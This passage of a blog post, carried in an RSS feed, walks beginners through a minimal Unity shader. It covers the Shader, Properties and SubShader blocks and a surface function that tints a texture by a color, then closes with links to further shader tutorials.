&lt;p&gt;Now go back to the Project window and double click our new Shader file. Unity will launch an IDE for use to check out the code. You can configure your choice of IDE; I have VSCode configured. Open the Shader file, and let’s check out the code. I created some basic shader code you can use.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#shader-code"&gt;
  &lt;/a&gt;
  Shader Code &lt;a&gt;&lt;/a&gt;
&lt;/h3&gt;

&lt;p&gt;Here is the complete, minimal shader code:&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--a90si7LV--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://georgeoffley-blog-images.s3.amazonaws.com/2021-11-21-shenanigans-in-shaders/code.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--a90si7LV--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://georgeoffley-blog-images.s3.amazonaws.com/2021-11-21-shenanigans-in-shaders/code.png" alt="Full Shader Code" width="880" height="611"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;It looks a bit much to anyone new to this, including myself, so let’s take it a section at a time. The first thing at the top, starting with “Shader,” is the &lt;em&gt;Shader Block&lt;/em&gt;. This is used to define our Shader Object. You can use this to define your properties, create many shaders using the &lt;em&gt;SubShader&lt;/em&gt; blocks, assign custom options, and assign a &lt;em&gt;fallback&lt;/em&gt; shader object. Here you can see the name of our shader and that it is in the “Custom” directory.&lt;/p&gt;

&lt;p&gt;Within the Shader block curly brackets, we have our other sections. The first is our &lt;em&gt;Properties&lt;/em&gt;. The properties box is where we define the properties for our materials. A material property is what Unity stores along with our materials. This allows for different configurations within Unity by creating things like sliders and inputs within the Inspector window for us to play around with. We defined two properties, the &lt;em&gt;MainColor&lt;/em&gt; and the &lt;em&gt;MainTexture&lt;/em&gt;. Using square brackets, I outlined which property was the default color and default texture. We also defined the default values for these properties. There’s a bit to these values but suffice it to say, both values are default white.&lt;/p&gt;

&lt;p&gt;The second block is our SubShader; this is where our shader logic goes. You can define multiple sub shaders for many different uses. For example, depending on the graphics hardware you want to support, you can make shaders for the various graphics APIs. Within our block, you can see some code for assigning &lt;a href="https://docs.unity3d.com/Manual/SL-SubShaderTags.html"&gt;&lt;em&gt;tags&lt;/em&gt;&lt;/a&gt;, assigning &lt;a href="https://docs.unity3d.com/Manual/SL-ShaderLOD.html"&gt;&lt;em&gt;levels of detail (LOD)&lt;/em&gt;&lt;/a&gt;, and the &lt;a href="https://en.wikibooks.org/wiki/Cg_Programming/Unity"&gt;&lt;em&gt;CGPROGRAM&lt;/em&gt;&lt;/a&gt; block. I want to draw your attention to this section of the code:&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--5ET4sGMX--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://georgeoffley-blog-images.s3.amazonaws.com/2021-11-21-shenanigans-in-shaders/output.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--5ET4sGMX--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://georgeoffley-blog-images.s3.amazonaws.com/2021-11-21-shenanigans-in-shaders/output.png" alt="Output function" width="880" height="543"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;First, we define the data types for our inputs and outputs and create a function for us to serve the outputs into unity. Our Input we set up as &lt;em&gt;uv_Maintex&lt;/em&gt;; this allows for us to input a texture object. Then we create a &lt;em&gt;fixed4&lt;/em&gt; variable for our &lt;em&gt;_Color&lt;/em&gt; attribute. The &lt;em&gt;o.Albedo&lt;/em&gt; parameter is what is used to control the base color of the surface. Here we are taking the values of our texture and multiplying them by our color input. The code above gets you something similar to this:&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--dbifhzAV--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://georgeoffley-blog-images.s3.amazonaws.com/2021-11-21-shenanigans-in-shaders/color.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--dbifhzAV--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://georgeoffley-blog-images.s3.amazonaws.com/2021-11-21-shenanigans-in-shaders/color.png" alt="Output function" width="857" height="716"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;I was proud of myself the first time I made this from memory. Our coded shader lets us control the color of the material and add basic textures to it. Working in graphics does not lead to instant gratification, as anything you do requires a ton of setup. However, this and &lt;a href="https://www.shadertoy.com/"&gt;ShaderToy&lt;/a&gt; get you that dopamine hit. &lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#conclusion"&gt;
  &lt;/a&gt;
  Conclusion &lt;a&gt;&lt;/a&gt;
&lt;/h3&gt;

&lt;p&gt;Above I went through some fundamentals of shaders in Unity. I skipped over a ton of information as I’m still learning a lot, and a full informed explainer would be twenty pages long. There is a lot to programming graphics and shaders specifically. I suggest you check out stuff like &lt;a href="https://github.com/Xibanya/ShaderTutorials"&gt;Team Dogpit’s shader tutorial&lt;/a&gt; for a way better deep dive. I’m excited to dig into this world. I want to learn to create some of the incredible stories I see in animation, and any first step is a step in the right direction. Thanks for reading.&lt;/p&gt;

&lt;p&gt;-George&lt;/p&gt;

</description>
      <category>unity3d</category>
      <category>graphics</category>
    </item>
  </channel>
</rss>
